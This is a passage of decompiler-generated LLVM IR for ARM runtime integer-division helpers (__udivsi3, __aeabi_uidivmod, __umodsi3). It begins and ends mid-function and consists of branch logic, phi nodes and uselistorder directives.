  uselistorder i32 32, { 28, 32, 33, 5, 4, 7, 6, 9, 8, 11, 10, 29, 13, 12, 14, 16, 15, 17, 18, 20, 19, 30, 31, 21, 0, 22, 1, 2, 3, 34, 35, 23, 36, 24, 25, 26, 27 }
  uselistorder i32 10, { 35, 0, 19, 6, 22, 24, 7, 23, 8, 25, 9, 26, 3, 27, 28, 20, 10, 29, 21, 30, 11, 31, 32, 12, 2, 13, 14, 33, 15, 34, 4, 36, 37, 38, 39, 40, 41, 16, 42, 43, 44, 17, 45, 47, 48, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 5, 63, 46, 18 }
  uselistorder i8 0, { 17, 18, 0, 4, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 29, 7, 30, 1, 6, 5, 8, 31, 32, 33, 34, 35, 14, 36, 37, 40, 15, 38, 39, 13, 41, 42, 43, 44, 45, 9, 10, 3, 11, 16, 12, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11d00, { 1, 0 }
  uselistorder label %dec_label_pc_11ca4, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_11c24, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_11d14 = add i32 %arg2, -1
  %v7_11d14 = icmp eq i32 %arg2, 1
  br i1 %v7_11d14, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_11d18 = load i32, i32* @r0, align 4
  ret i32 %v2_11d18

bb80:                                             ; preds = %entry
  %v2_11d14 = icmp eq i32 %arg2, 0
  br i1 %v2_11d14, label %dec_label_pc_11dfc, label %dec_label_pc_11d20

dec_label_pc_11d20:                               ; preds = %bb80
  %v0_11d20 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_11d20, %arg2
  br i1 %tmp, label %dec_label_pc_11d28, label %dec_label_pc_11db4

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11d20
  %v2_11d28 = and i32 %v1_11d14, %arg2
  %v4_11d28 = icmp eq i32 %v2_11d28, 0
  br i1 %v4_11d28, label %dec_label_pc_11dc0, label %dec_label_pc_11d30

dec_label_pc_11d30:                               ; preds = %dec_label_pc_11d28
  %v3_11d30 = icmp ult i32 %arg2, 536870912
  br i1 %v3_11d30, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11d30
  %v4_11d34 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11d30, %.thread
  %v0_11d54.pr36.ph = phi i32 [ %v4_11d34, %.thread ], [ %arg2, %dec_label_pc_11d30 ]
  %storemerge115 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11d30 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_11d54.pr36 = phi i32 [ %v4_11d48, %bb83 ], [ %v0_11d54.pr36.ph, %.preheader.preheader ]
  %v1_11d4c = phi i32 [ %v4_11d4c, %bb83 ], [ %storemerge115, %.preheader.preheader ]
  %v2_11d40 = icmp ugt i32 %v0_11d54.pr36, 268435455
  br i1 %v2_11d40, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11d54thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_11d44 = icmp ult i32 %v0_11d54.pr36, %v0_11d20
  br i1 %v4_11d44, label %bb82, label %dec_label_pc_11d54thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_11d48 = and i32 %v0_11d54.pr36, 268435456
  %v3_11d48 = icmp eq i32 %v2_11d48, 0
  %v4_11d48 = mul i32 %v0_11d54.pr36, 16
  br i1 %v3_11d48, label %bb83, label %dec_label_pc_11d54.loopexit

bb83:                                             ; preds = %bb82
  %v2_11d4c = and i32 %v1_11d4c, 268435456
  %v3_11d4c = icmp eq i32 %v2_11d4c, 0
  %v4_11d4c = mul i32 %v1_11d4c, 16
  br i1 %v3_11d4c, label %.preheader, label %dec_label_pc_11d54thread-pre-split.loopexit.loopexit

dec_label_pc_11d54thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_11d6048.ph = phi i32 [ %v1_11d4c, %bb81 ], [ %v4_11d4c, %bb83 ]
  %v0_11d54.pr38.ph = phi i32 [ %v0_11d54.pr36, %bb81 ], [ %v4_11d48, %bb83 ]
  br label %dec_label_pc_11d54thread-pre-split.loopexit

dec_label_pc_11d54thread-pre-split.loopexit:      ; preds = %dec_label_pc_11d54thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11d6048 = phi i32 [ %v1_11d4c, %.thread2 ], [ %v1_11d6048.ph, %dec_label_pc_11d54thread-pre-split.loopexit.loopexit ]
  %v0_11d54.pr38 = phi i32 [ %v0_11d54.pr36, %.thread2 ], [ %v0_11d54.pr38.ph, %dec_label_pc_11d54thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11d54thread-pre-split

dec_label_pc_11d54thread-pre-split:               ; preds = %dec_label_pc_11d54thread-pre-split.loopexit, %bb85
  %v1_11d6046 = phi i32 [ %v1_11d6048, %dec_label_pc_11d54thread-pre-split.loopexit ], [ %v3_11d60, %bb85 ]
  %v0_11d54.pr = phi i32 [ %v0_11d54.pr38, %dec_label_pc_11d54thread-pre-split.loopexit ], [ %v3_11d5c, %bb85 ]
  br label %dec_label_pc_11d54

dec_label_pc_11d54.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_11d54

dec_label_pc_11d54:                               ; preds = %dec_label_pc_11d54.loopexit, %dec_label_pc_11d54thread-pre-split
  %v1_11d60 = phi i32 [ %v1_11d6046, %dec_label_pc_11d54thread-pre-split ], [ %v1_11d4c, %dec_label_pc_11d54.loopexit ]
  %v1_11d5c = phi i32 [ %v0_11d54.pr, %dec_label_pc_11d54thread-pre-split ], [ %v4_11d48, %dec_label_pc_11d54.loopexit ]
  %v2_11d54 = icmp slt i32 %v1_11d5c, 0
  br i1 %v2_11d54, label %dec_label_pc_11d68, label %bb84

bb84:                                             ; preds = %dec_label_pc_11d54
  %v4_11d58 = icmp ult i32 %v1_11d5c, %v0_11d20
  br i1 %v4_11d58, label %bb85, label %dec_label_pc_11d68

bb85:                                             ; preds = %bb84
  %v3_11d5c = mul i32 %v1_11d5c, 2
  %v2_11d60 = icmp slt i32 %v1_11d60, 0
  %v3_11d60 = mul i32 %v1_11d60, 2
  br i1 %v2_11d60, label %dec_label_pc_11d68, label %dec_label_pc_11d54thread-pre-split

dec_label_pc_11d68:                               ; preds = %bb84, %dec_label_pc_11d54, %bb85
  %v2_11d7459 = phi i32 [ %v3_11d60, %bb85 ], [ %v1_11d60, %bb84 ], [ %v1_11d60, %dec_label_pc_11d54 ]
  %v1_11d6c51 = phi i32 [ %v3_11d5c, %bb85 ], [ %v1_11d5c, %bb84 ], [ %v1_11d5c, %dec_label_pc_11d54 ]
  br label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %.thread11, %dec_label_pc_11d68
  %v1_11da0 = phi i32 [ %v4_11da0, %.thread11 ], [ %v2_11d7459, %dec_label_pc_11d68 ]
  %v1_11d74 = phi i32 [ %v0_11dac, %.thread11 ], [ 0, %dec_label_pc_11d68 ]
  %v1_11da4 = phi i32 [ %v4_11da4, %.thread11 ], [ %v1_11d6c51, %dec_label_pc_11d68 ]
  %v1_11d70 = phi i32 [ %v0_11d9c, %.thread11 ], [ %v0_11d20, %dec_label_pc_11d68 ]
  %v3_11d6c = icmp ult i32 %v1_11d70, %v1_11da4
  br i1 %v3_11d6c, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_11d6c
  %v3_11d70 = sub i32 %v1_11d70, %v1_11da4
  %v3_11d74 = or i32 %v1_11d74, %v1_11da0
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11d6c, %bb86
  %v1_11d7c = phi i32 [ %v1_11d70, %dec_label_pc_11d6c ], [ %v3_11d70, %bb86 ]
  %v1_11d80 = phi i32 [ %v1_11d74, %dec_label_pc_11d6c ], [ %v3_11d74, %bb86 ]
  %v4_11d78 = udiv i32 %v1_11da4, 2
  %v6_11d78 = icmp ult i32 %v1_11d7c, %v4_11d78
  br i1 %v6_11d78, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_11d7c = urem i32 %v1_11da4, 2
  %v4_11d7c = icmp eq i32 %v3_11d7c, 0
  %v6_11d7c = sub i32 %v1_11d7c, %v4_11d78
  br i1 %v4_11d7c, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11d80 = udiv i32 %v1_11da0, 2
  %v6_11d80 = or i32 %v1_11d80, %v5_11d80
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_11d88 = phi i32 [ %v6_11d7c, %bb87 ], [ %v1_11d7c, %.thread7 ], [ %v6_11d7c, %bb88 ]
  %v1_11d8c = phi i32 [ %v1_11d80, %bb87 ], [ %v1_11d80, %.thread7 ], [ %v6_11d80, %bb88 ]
  %v4_11d84 = udiv i32 %v1_11da4, 4
  %v6_11d84 = icmp ult i32 %v1_11d88, %v4_11d84
  br i1 %v6_11d84, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_11d88 = and i32 %v1_11da4, 2
  %v4_11d88 = icmp eq i32 %v3_11d88, 0
  %v6_11d88 = sub i32 %v1_11d88, %v4_11d84
  br i1 %v4_11d88, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11d8c = udiv i32 %v1_11da0, 4
  %v6_11d8c = or i32 %v1_11d8c, %v5_11d8c
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_11d94 = phi i32 [ %v6_11d88, %bb89 ], [ %v1_11d88, %.thread8 ], [ %v6_11d88, %bb90 ]
  %v1_11d98 = phi i32 [ %v1_11d8c, %bb89 ], [ %v1_11d8c, %.thread8 ], [ %v6_11d8c, %bb90 ]
  %v4_11d90 = udiv i32 %v1_11da4, 8
  %v6_11d90 = icmp ult i32 %v1_11d94, %v4_11d90
  br i1 %v6_11d90, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_11d94 = and i32 %v1_11da4, 4
  %v4_11d94 = icmp eq i32 %v3_11d94, 0
  %v6_11d94 = sub i32 %v1_11d94, %v4_11d90
  br i1 %v4_11d94, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_11d98 = udiv i32 %v1_11da0, 8
  %v6_11d98 = or i32 %v1_11d98, %v5_11d98
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_11dac = phi i32 [ %v1_11d98, %bb91 ], [ %v1_11d98, %.thread9 ], [ %v6_11d98, %bb92 ]
  %v0_11d9c = phi i32 [ %v6_11d94, %bb91 ], [ %v1_11d94, %.thread9 ], [ %v6_11d94, %bb92 ]
  %v2_11d9c = icmp eq i32 %v0_11d9c, 0
  br i1 %v2_11d9c, label %dec_label_pc_11dac, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp120 = icmp ult i32 %v1_11da0, 16
  br i1 %tmp120, label %dec_label_pc_11dac, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_11da0 = udiv i32 %v1_11da0, 16
  %v4_11da4 = udiv i32 %v1_11da4, 16
  br label %dec_label_pc_11d6c

dec_label_pc_11dac:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_11dac

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11d20
  %v9_11d20 = icmp eq i32 %v0_11d20, %arg2
  %. = zext i1 %v9_11d20 to i32
  ret i32 %.

dec_label_pc_11dc0:                               ; preds = %dec_label_pc_11d28
  %v2_11dc0 = icmp ugt i32 %arg2, 65535
  br i1 %v2_11dc0, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_11dc0
  %v2_11dc4 = and i32 %arg2, 32768
  %v3_11dc4 = icmp eq i32 %v2_11dc4, 0
  %v4_11dc4 = udiv i32 %arg2, 65536
  br i1 %v3_11dc4, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_11dc0
  %v0_11dd065 = phi i32 [ %arg2, %dec_label_pc_11dc0 ], [ %v4_11dc4, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_11dd4 = phi i32 [ %v0_11dd065, %.thread16 ], [ %v4_11dc4, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_11dd0 = icmp ugt i32 %v1_11dd4, 255
  br i1 %v2_11dd0, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_11dd4 = and i32 %v1_11dd4, 128
  %v3_11dd4 = icmp eq i32 %v2_11dd4, 0
  %v4_11dd4 = udiv i32 %v1_11dd4, 256
  br i1 %v3_11dd4, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11dd8 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_11de4 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_11dd8, %bb100 ]
  %v1_11de0 = phi i32 [ %v1_11dd4, %bb98 ], [ %v4_11dd4, %bb99 ], [ %v4_11dd4, %bb100 ]
  %v2_11ddc = icmp ugt i32 %v1_11de0, 15
  br i1 %v2_11ddc, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_11de0 = and i32 %v1_11de0, 8
  %v3_11de0 = icmp eq i32 %v2_11de0, 0
  %v4_11de0 = udiv i32 %v1_11de0, 16
  br i1 %v3_11de0, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_11de4 = add nsw i32 %v1_11de4, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_11dec = phi i32 [ %v1_11de4, %.thread17 ], [ %v1_11de4, %bb101 ], [ %v2_11de4, %bb102 ]
  %v5_11df0 = phi i32 [ %v1_11de0, %.thread17 ], [ %v4_11de0, %bb101 ], [ %v4_11de0, %bb102 ]
  %v2_11de8 = icmp ugt i32 %v5_11df0, 3
  %v7_11de8 = icmp eq i32 %v5_11df0, 4
  %v2_11dec = xor i1 %v7_11de8, true
  %v3_11dec = and i1 %v2_11de8, %v2_11dec
  br i1 %v3_11dec, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_11dec = add nsw i32 %v4_11dec, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_11df0 = phi i32 [ %v4_11dec, %.thread18 ], [ %v5_11dec, %bb103 ]
  %v2_11df0 = xor i1 %v2_11de8, true
  %v3_11df0 = or i1 %v7_11de8, %v2_11df0
  br i1 %v3_11df0, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_11df0 = udiv i32 %v5_11df0, 2
  %v9_11df0 = add i32 %v4_11df0, %v8_11df0
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_11df4 = phi i32 [ %v4_11df0, %bb104 ], [ %v9_11df0, %bb105 ]
  %v6_11df4 = lshr i32 %v0_11d20, %v1_11df4
  ret i32 %v6_11df4

dec_label_pc_11dfc:                               ; preds = %bb80
  %v0_11dfc = load i32, i32* @lr, align 4
  %v0_11e00 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11dfc)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11df0, { 1, 0 }
  uselistorder i1 %v7_11de8, { 1, 0 }
  uselistorder i32 %v4_11de0, { 1, 0 }
  uselistorder i32 %v1_11de0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11dd4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_11dd4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11dc4, { 1, 0 }
  uselistorder i32 %v0_11d9c, { 1, 0 }
  uselistorder i32 %v4_11d90, { 1, 0 }
  uselistorder i32 %v1_11d98, { 1, 2, 0 }
  uselistorder i32 %v4_11d84, { 1, 0 }
  uselistorder i32 %v1_11d8c, { 1, 2, 0 }
  uselistorder i32 %v4_11d78, { 1, 0 }
  uselistorder i32 %v1_11d80, { 1, 2, 0 }
  uselistorder i32 %v1_11da4, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_11d74, { 1, 0 }
  uselistorder i32 %v1_11da0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_11d60, { 1, 0 }
  uselistorder i32 %v3_11d5c, { 1, 0 }
  uselistorder i32 %v1_11d5c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_11d60, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11d4c, { 1, 0 }
  uselistorder i32 %v4_11d48, { 2, 1, 0 }
  uselistorder i32 %v1_11d4c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11d54.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_11d20, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 40, 2, 3, 4, 5, 6, 90, 32, 41, 48, 91, 10, 11, 12, 68, 59, 69, 70, 71, 42, 13, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 14, 15, 33, 34, 88, 89, 58, 39, 49, 92, 8, 9, 57, 7, 93, 17, 16, 50, 53, 51, 54, 46, 52, 47, 56, 94, 18, 95, 96, 19, 35, 36, 97, 60, 61, 37, 98, 38, 99, 20, 21, 100, 62, 63, 22, 23, 101, 64, 65, 24, 25, 102, 66, 67, 26, 27, 45, 103, 104, 55, 105, 43, 28, 44, 29, 30, 31 }
  uselistorder i32 15, { 13, 14, 2, 15, 3, 16, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 12, 19, 20, 21, 22, 0, 23, 24, 25, 26, 1, 27 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 418, 419, 19, 20, 21, 22, 23, 24, 25, 421, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 43, 42, 41, 44, 417, 422, 49, 45, 48, 46, 47, 420, 51, 50, 52, 53, 54, 57, 56, 55, 58, 60, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 77, 76, 85, 81, 86, 82, 78, 79, 83, 80, 87, 88, 84, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 105, 104, 103, 111, 106, 117, 118, 112, 107, 119, 120, 113, 108, 121, 114, 115, 122, 116, 123, 109, 124, 110, 125, 126, 127, 128, 129, 130, 131, 134, 135, 138, 136, 132, 139, 137, 133, 142, 141, 140, 145, 146, 143, 147, 144, 148, 153, 151, 154, 152, 149, 150, 155, 415, 423, 156, 157, 158, 159, 163, 160, 161, 162, 165, 166, 164, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 182, 183, 186, 184, 180, 187, 185, 181, 190, 189, 188, 193, 194, 191, 195, 192, 196, 201, 199, 202, 200, 197, 198, 203, 416, 424, 204, 205, 206, 207, 211, 208, 209, 210, 213, 214, 212, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 232, 231, 233, 234, 235, 239, 245, 240, 236, 241, 246, 242, 247, 243, 237, 248, 238, 249, 250, 244, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 262, 263, 261, 264, 267, 268, 266, 265, 269, 272, 271, 270, 279, 276, 280, 277, 273, 281, 278, 274, 275, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 293, 292, 294, 295, 297, 296, 298, 299, 300, 301, 304, 311, 305, 306, 302, 307, 308, 309, 303, 312, 310, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 326, 325, 327, 328, 329, 333, 340, 334, 335, 341, 336, 330, 331, 337, 332, 338, 342, 339, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 361, 360, 362, 363, 364, 375, 370, 365, 376, 371, 372, 377, 373, 366, 367, 368, 378, 379, 380, 381, 374, 369, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 394, 393, 395, 396, 397, 398, 399, 400, 401, 403, 402, 404, 405, 406, 407, 408, 409, 411, 410, 412, 413, 414 }
  uselistorder i32 128, { 5, 6, 7, 12, 0, 13, 8, 9, 10, 11, 14, 1, 15, 2, 3, 16, 17, 18, 4 }
  uselistorder i32 255, { 5, 6, 2, 7, 3, 8, 4, 9, 0, 1 }
  uselistorder i32 65536, { 9, 10, 11, 12, 13, 14, 1, 16, 15, 17, 2, 18, 0, 3, 19, 20, 21, 22, 23, 26, 24, 25, 27, 28, 4, 32, 33, 29, 30, 34, 31, 35, 36, 37, 38, 39, 41, 40, 42, 43, 45, 44, 47, 46, 49, 48, 50, 51, 53, 52, 55, 54, 56, 57, 62, 63, 64, 65, 58, 59, 60, 61, 66, 69, 70, 71, 67, 68, 72, 5, 73, 76, 77, 78, 74, 75, 79, 6, 80, 84, 85, 86, 81, 82, 83, 87, 88, 89, 90, 91, 92, 94, 93, 95, 7, 96, 98, 99, 97, 100, 8, 101, 103, 104, 102, 105 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 7, 12, 6, 5, 4, 10, 11, 8, 9, 0, 3, 1, 2 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_11dac, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_11d68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d54thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11e10 = udiv i32 %arg1, %arg2
  ret i32 %v2_11e10
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_11e24 = add i32 %arg2, -1
  %v2_11e24 = icmp eq i32 %arg2, 0
  br i1 %v2_11e24, label %dec_label_pc_11ee0, label %dec_label_pc_11e2c

dec_label_pc_11e2c:                               ; preds = %entry
  %v7_11e24 = icmp eq i32 %arg2, 1
  br i1 %v7_11e24, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_11e2c
  %v1_11e2c = load i32, i32* @r0, align 4
  %v10_11e2c = icmp eq i32 %v1_11e2c, %arg2
  br i1 %v10_11e2c, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_11e2c, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_11e2c = icmp ult i32 %v1_11e2c, %arg2
  br i1 %v4_11e2c, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_11e34 = and i32 %v1_11e24, %arg2
  %v8_11e34 = icmp eq i32 %v6_11e34, 0
  br i1 %v8_11e34, label %.thread67, label %dec_label_pc_11e44.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_11e38 = phi i32 [ %v1_11e2c, %bb75 ], [ 0, %.thread65 ]
  %v3_11e38 = and i32 %v1_11e38, %v1_11e24
  br label %bb76

dec_label_pc_11e44.preheader:                     ; preds = %bb75
  %v2_11e4497 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_11e4497, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_11ed4, %bb74, %bb89, %bb84, %dec_label_pc_11ea4, %.thread67
  %v5_11e3c = phi i32 [ %v1_11e2c, %bb74 ], [ %v3_11e38, %.thread67 ], [ %v1_11e80.v6_11e80.v6_11e88.v6_11e90, %dec_label_pc_11ea4 ], [ 0, %bb84 ], [ %v1_11ed8, %dec_label_pc_11ed4 ], [ %v2_11ed4, %bb89 ]
  ret i32 %v5_11e3c

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_11e44.preheader
  %v0_11e58.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_11e44.preheader ], [ %v4_11e4c, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11e44.preheader ], [ %v2_11e5011, %.thread1.thread9 ]
  br label %dec_label_pc_11e58thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_11e44.preheader, %.thread1.thread9
  %storemerge99 = phi i32 [ %v2_11e5011, %.thread1.thread9 ], [ 0, %dec_label_pc_11e44.preheader ]
  %v0_11e58.pr3398 = phi i32 [ %v4_11e4c, %.thread1.thread9 ], [ %arg2, %dec_label_pc_11e44.preheader ]
  %v4_11e48 = icmp ult i32 %v0_11e58.pr3398, %v1_11e2c
  br i1 %v4_11e48, label %bb78, label %dec_label_pc_11e58thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_11e4c = and i32 %v0_11e58.pr3398, 268435456
  %v3_11e4c = icmp eq i32 %v2_11e4c, 0
  %v4_11e4c = mul i32 %v0_11e58.pr3398, 16
  br i1 %v3_11e4c, label %.thread1.thread9, label %dec_label_pc_11e58.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_11e5011 = add i32 %storemerge99, 4
  %v2_11e44 = icmp ugt i32 %v4_11e4c, 268435455
  br i1 %v2_11e44, label %.thread, label %bb77

dec_label_pc_11e58thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_11e58thread-pre-split.loopexit

dec_label_pc_11e58thread-pre-split.loopexit:      ; preds = %dec_label_pc_11e58thread-pre-split.loopexit.loopexit, %.thread
  %v0_11e58.pr3396 = phi i32 [ %v0_11e58.pr33.lcssa, %.thread ], [ %v0_11e58.pr3398, %dec_label_pc_11e58thread-pre-split.loopexit.loopexit ]
  %storemerge93 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge99, %dec_label_pc_11e58thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11e58thread-pre-split

dec_label_pc_11e58thread-pre-split:               ; preds = %.thread4, %dec_label_pc_11e58thread-pre-split.loopexit
  %v1_11e6439 = phi i32 [ %storemerge93, %dec_label_pc_11e58thread-pre-split.loopexit ], [ %v2_11e64, %.thread4 ]
  %v0_11e58.pr = phi i32 [ %v0_11e58.pr3396, %dec_label_pc_11e58thread-pre-split.loopexit ], [ %v3_11e60, %.thread4 ]
  br label %dec_label_pc_11e58

dec_label_pc_11e58.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_11e58

dec_label_pc_11e58:                               ; preds = %dec_label_pc_11e58.loopexit, %dec_label_pc_11e58thread-pre-split
  %v0_11e6c.pr = phi i32 [ %v1_11e6439, %dec_label_pc_11e58thread-pre-split ], [ %storemerge99, %dec_label_pc_11e58.loopexit ]
  %v1_11e60 = phi i32 [ %v0_11e58.pr, %dec_label_pc_11e58thread-pre-split ], [ %v4_11e4c, %dec_label_pc_11e58.loopexit ]
  %v2_11e58 = icmp slt i32 %v1_11e60, 0
  br i1 %v2_11e58, label %dec_label_pc_11e6c, label %bb79

bb79:                                             ; preds = %dec_label_pc_11e58
  %v4_11e5c = icmp ult i32 %v1_11e60, %v1_11e2c
  br i1 %v4_11e5c, label %.thread4, label %dec_label_pc_11e6c

.thread4:                                         ; preds = %bb79
  %v3_11e60 = mul i32 %v1_11e60, 2
  %v2_11e64 = add i32 %v0_11e6c.pr, 1
  br label %dec_label_pc_11e58thread-pre-split

dec_label_pc_11e6c:                               ; preds = %bb79, %dec_label_pc_11e58
  %v2_11e6c = add i32 %v0_11e6c.pr, -3
  %v5_11e70 = icmp slt i32 %v0_11e6c.pr, 3
  br i1 %v5_11e70, label %dec_label_pc_11eb0, label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e6c, %bb83
  %v6_11e9c = phi i32 [ %v0_11ea4, %bb83 ], [ %v2_11e6c, %dec_label_pc_11e6c ]
  %v1_11e78 = phi i32 [ %v1_11e80.v6_11e80.v6_11e88.v6_11e90, %bb83 ], [ %v1_11e2c, %dec_label_pc_11e6c ]
  %v3_11e9812 = phi i32 [ %v3_11e98, %bb83 ], [ %v1_11e60, %dec_label_pc_11e6c ]
  %v3_11e74 = icmp ult i32 %v1_11e78, %v3_11e9812
  %v3_11e78 = select i1 %v3_11e74, i32 0, i32 %v3_11e9812
  %v1_11e80 = sub i32 %v1_11e78, %v3_11e78
  %v4_11e7c = udiv i32 %v3_11e9812, 2
  %v6_11e7c = icmp ult i32 %v1_11e80, %v4_11e7c
  %v6_11e80 = select i1 %v6_11e7c, i32 0, i32 %v4_11e7c
  %v1_11e80.v6_11e80 = sub i32 %v1_11e80, %v6_11e80
  %.demorgan = and i1 %v3_11e74, %v6_11e7c
  %v4_11e84 = udiv i32 %v3_11e9812, 4
  %v6_11e84 = icmp ult i32 %v1_11e80.v6_11e80, %v4_11e84
  %v6_11e88 = select i1 %v6_11e84, i32 0, i32 %v4_11e84
  %v1_11e80.v6_11e80.v6_11e88 = sub i32 %v1_11e80.v6_11e80, %v6_11e88
  %.demorgan71 = and i1 %.demorgan, %v6_11e84
